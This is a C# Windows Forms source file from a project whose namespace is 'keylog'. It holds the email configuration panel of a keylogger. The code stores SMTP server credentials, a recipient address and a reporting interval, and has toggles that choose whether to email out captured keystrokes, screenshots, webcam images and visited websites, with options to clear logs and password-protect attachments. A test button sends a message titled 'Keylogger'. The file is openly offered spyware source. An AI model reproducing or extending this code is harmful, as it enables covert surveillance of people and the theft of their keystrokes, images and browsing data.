using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows.Forms;
using System.IO;
using tt;
using System.Net.Mail;
using System.Net;

namespace keylog
{
    public partial class Email : UserControl
    {
        public Email()
        {
            InitializeComponent();
        }

        private void btn_OK_Click(object sender, EventArgs e)
        {
            Dictionary<string, string> d = new Dictionary<string, string>();
            if (!ckb_enable.Checked)
                d.Add("Enable", "false");
            else
            {
                if (tb_hours.Text.Trim().All(char.IsDigit) == false || tb_hours.Text.Trim() == "")
                {
                    tb_hours.Text = "12";
                }
                if (tb_minutes.Text.Trim().All(char.IsDigit) == false || tb_minutes.Text.Trim() == "")
                {
                    tb_minutes.Text = "30";
                }

                int iHours;
                Int32.TryParse(tb_hours.Text, out iHours);
                int iMinutes;
                Int32.TryParse(tb_minutes.Text, out iMinutes);

                if (iHours > 3600 || iMinutes > 3600 || iHours < 0 || iMinutes <= 0)
                {
                    MessageBox.Show("Value hours from 0 to 3600 \r\nValue minutes from 1 to 3600", "Alert", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                int iLimit;
                Int32.TryParse(tb_limitSizeAttach.Text, out iLimit);
                if (ckb_limitAttachSize.Checked)
                {
                    if (tb_limitSizeAttach.Text.All(char.IsDigit) == false || tb_limitSizeAttach.Text.Trim() != "")
                    {
                        tb_limitSizeAttach.Text = "5000";
                    }
                    else if (iLimit < 100 || iLimit > 2000000000)
                    {
                        MessageBox.Show("Value limit from 100 to 2000000000", "Alert", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        return;
                    }
                }

                string password = tb_attachPassword.Text.ToString();
                foreach (char c in password)
                {
                    if (char.IsDigit(c) || char.IsLetter(c) || char.IsSymbol(c) || c == ' ')
                    { }
                    else
                    {
                        MessageBox.Show("Invail Password", "Alert", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        return;
                    }
                }

                if (ckb_protectAttach.Checked)
                {
                    if (tb_attachPassword.Text == "" || tb_attachPassword.Text == null)
                    {
                        MessageBox.Show("Input password to compress", "Alert", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        return;
                    }
                }
                if (ckb_enable.Checked)
                {
                    d.Add("Enable", "true");
                    d.Add("Hours", tb_hours.Text.ToString());
                    d.Add("Minutes", tb_minutes.Text.ToString());

                    if (ckb_keystroke.Checked)
                        d.Add("Logs", "true");
                    else
                        d.Add("Logs", "false");

                    if (ckb_image.Checked)
                        d.Add("Images", "true");
                    else
                        d.Add("Images", "false");

                    if (ckb_webcam.Checked)
                        d.Add("Webcam", "true");
                    else
                        d.Add("Webcam", "false");

                    if (ckb_Website.Checked)
                        d.Add("Web", "true");
                    else
                        d.Add("Web", "false");

                    if (ckb_clearthelogs.Checked)
                        d.Add("Clear", "true");
                    else
                        d.Add("Clear", "false");

                    if (ckb_limitAttachSize.Checked)
                    {
                        d.Add("Limit", "true");
                        d.Add("Kb", tb_limitSizeAttach.Text.ToString());
                    }
                    else
                        d.Add("Limit", "false");

                    if (ckb_protectAttach.Checked)
                    {
                        d.Add("Protect", "true");
                        d.Add("Password", tb_attachPassword.Text.ToString());
                    }
                    else
                        d.Add("Protect", "false");

                    d.Add("To", tb_sentto.Text);
                    d.Add("SMTP", tb_SMTPserver.Text);
                    d.Add("Port", tb_portnumber.Text);

                    d.Add("Username", tb_username.Text);
                    d.Add("password", tb_password.Text);
                }
            }
            using (StreamWriter file = new StreamWriter("email_conf.ini"))
                foreach (var entry in d)
                    file.WriteLine("{0},{1}", entry.Key, entry.Value);

        }

        private void Email_Load(object sender, EventArgs e)
        {
            Dictionary<string, string> d = new Dictionary<string, string>();
            if (File.Exists("email_conf.ini"))
            {
                Functions.Load_File("email_conf.ini",d);

                if (Boolean.Parse(d["Enable"].ToString()))
                {
                    tb_sentto.Text = d["To"].ToString();
                    tb_SMTPserver.Text = d["SMTP"].ToString();
                    tb_portnumber.Text = d["Port"].ToString();
                    tb_username.Text = d["Username"].ToString();
                    tb_password.Text = d["password"].ToString();
                    ckb_enable.Checked = Boolean.Parse(d["Enable"].ToString());
                    tb_hours.Text = d["Hours"].ToString();
                    tb_minutes.Text = d["Minutes"].ToString();
                    ckb_keystroke.Checked = Boolean.Parse(d["Logs"].ToString());
                    ckb_image.Checked = Boolean.Parse(d["Images"].ToString());
                    ckb_webcam.Checked = Boolean.Parse(d["Webcam"].ToString());
                    ckb_Website.Checked = Boolean.Parse(d["Web"].ToString());
                    ckb_clearthelogs.Checked = Boolean.Parse(d["Clear"].ToString());
                    ckb_limitAttachSize.Checked = Boolean.Parse(d["Limit"].ToString());

                    if (ckb_limitAttachSize.Checked == true)
                        tb_limitSizeAttach.Text = d["Kb"].ToString();

                    ckb_protectAttach.Checked = Boolean.Parse(d["Protect"].ToString());

                    if (ckb_protectAttach.Checked == true)
                        tb_attachPassword.Text = d["Password"].ToString();
                }
                else
                    ckb_enable.Checked = false;


            }
            if (ckb_enable.Checked == false)
            {
                tb_sentto.Enabled = false;
                tb_SMTPserver.Enabled = false;
                tb_portnumber.Enabled = false;
                tb_username.Enabled = false;
                tb_password.Enabled = false;
                tb_hours.Enabled = false;
                tb_minutes.Enabled = false;
                ckb_keystroke.Enabled = false;
                ckb_image.Enabled = false;
                ckb_webcam.Enabled = false;
                ckb_Website.Enabled = false;
                ckb_clearthelogs.Enabled = false;
                ckb_limitAttachSize.Enabled = false;
                tb_limitSizeAttach.Enabled = false;
                ckb_protectAttach.Enabled = false;
                tb_attachPassword.Enabled = false;
            }
            else
            {
                tb_sentto.Enabled = true;
                tb_SMTPserver.Enabled = true;
                tb_portnumber.Enabled = true;
                tb_username.Enabled = true;
                tb_password.Enabled = true;
                tb_hours.Enabled = true;
                tb_minutes.Enabled = true;
                ckb_keystroke.Enabled = true;
                ckb_image.Enabled = true;
                ckb_webcam.Enabled = true;
                ckb_Website.Enabled = true;
                ckb_clearthelogs.Enabled = true;
                ckb_limitAttachSize.Enabled = true;
                tb_limitSizeAttach.Enabled = true;
                ckb_protectAttach.Enabled = true;
                tb_attachPassword.Enabled = true;
            }
        }

        private void bt_sendtest_Click(object sender, EventArgs e)
        {
            try
            {
                MailMessage mail = new MailMessage();
                SmtpClient smtpServer = new SmtpClient(tb_SMTPserver.Text);
                mail.From = new MailAddress(tb_username.Text);
                mail.To.Add(tb_sentto.Text);
                mail.Subject = "Keylogger";
                mail.Body = "Successful";

                int iPort;
                Int32.TryParse(tb_portnumber.Text.Trim(), out iPort);
                smtpServer.Port = iPort;

                smtpServer.Credentials = new NetworkCredential(tb_username.Text.Trim(), tb_password.Text.Trim());

                smtpServer.EnableSsl = true;

                smtpServer.Send(mail);
                MessageBox.Show("Thành công");
            }
            catch
            {
                MessageBox.Show("Gửi thất bại");
            }
        }

        private void ckb_enable_OnChange(object sender, EventArgs e)
        {
            if (ckb_enable.Checked == false)
            {
                tb_sentto.Enabled = false;
                tb_SMTPserver.Enabled = false;
                tb_portnumber.Enabled = false;
                tb_username.Enabled = false;
                tb_password.Enabled = false;
                tb_hours.Enabled = false;
                tb_minutes.Enabled = false;
                ckb_keystroke.Enabled = false;
                ckb_image.Enabled = false;
                ckb_webcam.Enabled = false;
                ckb_Website.Enabled = false;
                ckb_clearthelogs.Enabled = false;
                ckb_limitAttachSize.Enabled = false;
                tb_limitSizeAttach.Enabled = false;
                ckb_protectAttach.Enabled = false;
                tb_attachPassword.Enabled = false;
            }
            else
            {
                tb_sentto.Enabled = true;
                tb_SMTPserver.Enabled = true;
                tb_portnumber.Enabled = true;
                tb_username.Enabled = true;
                tb_password.Enabled = true;
                tb_hours.Enabled = true;
                tb_minutes.Enabled = true;
                ckb_keystroke.Enabled = true;
                ckb_image.Enabled = true;
                ckb_webcam.Enabled = true;
                ckb_Website.Enabled = true;
                ckb_clearthelogs.Enabled = true;
                ckb_limitAttachSize.Enabled = true;
                tb_limitSizeAttach.Enabled = true;
                ckb_protectAttach.Enabled = true;
                tb_attachPassword.Enabled = true;
            }
        }
    }
}
